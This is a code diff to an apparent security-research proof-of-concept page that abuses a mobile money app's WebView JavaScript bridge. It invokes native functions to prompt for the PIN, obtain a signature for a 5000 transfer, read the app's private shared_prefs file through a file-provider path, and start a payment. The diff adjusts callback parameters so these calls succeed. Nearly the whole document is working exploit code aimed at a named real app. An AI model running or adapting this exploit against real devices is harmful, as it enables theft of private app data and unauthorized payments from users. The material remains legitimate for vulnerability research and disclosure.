@@ -53,22 +53,31 @@
 
         // Global Callbacks for Native Invocations
         window.onPinResult = function(data) {
-            log("PIN RESULT RECEIVED FROM NATIVE: " + JSON.stringify(data));
+            log("PIN RESULT RECEIVED FROM NATIVE: " + (typeof data === 'object' ? JSON.stringify(data) : data));
         };
 
         window.onSignResult = function(data) {
-            log("CRYPTOGRAPHIC SIGNATURE RECEIVED: " + JSON.stringify(data));
+            log("CRYPTOGRAPHIC SIGNATURE RECEIVED: " + (typeof data === 'object' ? JSON.stringify(data) : data));
         };
 
         window.onFileResult = function(data) {
-            log("PRIVATE APP FILE EXFILTRATED (Base64): " + JSON.stringify(data).substring(0, 100) + "...");
+            var str = typeof data === 'object' ? JSON.stringify(data) : String(data);
+            log("APP FILE RECEIVED: " + (str.length > 80 ? str.substring(0, 80) + "..." : str));
+        };
+
+        window.onPayResult = function(data) {
+            log("PAYMENT RESULT: " + (typeof data === 'object' ? JSON.stringify(data) : data));
         };
 
         function triggerPinPrompt() {
             log("Invoking js_fun_verify_pin...");
             window.consumerapp.evaluate(JSON.stringify({
                 "functionName": "js_fun_verify_pin",
-                "params": { "callback": "onPinResult" }
+                "params": {
+                    "functionCallBackName": "onPinResult",
+                    "callback": "onPinResult",
+                    "isSupportBiometric": true
+                }
             }));
         }
 
@@ -77,19 +86,21 @@
             window.consumerapp.evaluate(JSON.stringify({
                 "functionName": "js_fun_h5_sign",
                 "params": {
-                    "request": "{\"amount\":\"5000\",\"action\":\"TRANSFER\"}",
-                    "callback": "onSignResult"
+                    "functionCallBackName": "onSignResult",
+                    "callback": "onSignResult",
+                    "request": "{\"amount\":\"5000\",\"action\":\"TRANSFER\"}"
                 }
             }));
         }
 
         function triggerFileTheft() {
-            log("Invoking js_fun_get_file_by_app...");
+            log("Invoking js_fun_getFileByApp...");
             window.consumerapp.evaluate(JSON.stringify({
-                "functionName": "js_fun_get_file_by_app",
+                "functionName": "js_fun_getFileByApp",
                 "params": {
-                    "filePath": "content://com.safaricom.mpesa.lifestyle.utilcode.fileprovider/root/data/data/com.safaricom.mpesa.lifestyle/shared_prefs/sp_utils.xml",
-                    "callback": "onFileResult"
+                    "functionCallBackName": "onFileResult",
+                    "callback": "onFileResult",
+                    "filePath": "content://com.safaricom.mpesa.lifestyle.utilcode.fileprovider/root/data/data/com.safaricom.mpesa.lifestyle/shared_prefs/sp_utils.xml"
                 }
             }));
         }
@@ -99,6 +110,8 @@
             window.consumerapp.evaluate(JSON.stringify({
                 "functionName": "js_fun_start_pay",
                 "params": {
+                    "functionCallBackName": "onPayResult",
+                    "callback": "onPayResult",
                     "tradeType": "1",
                     "amount": "100",
                     "payee": "Security Research PoC"
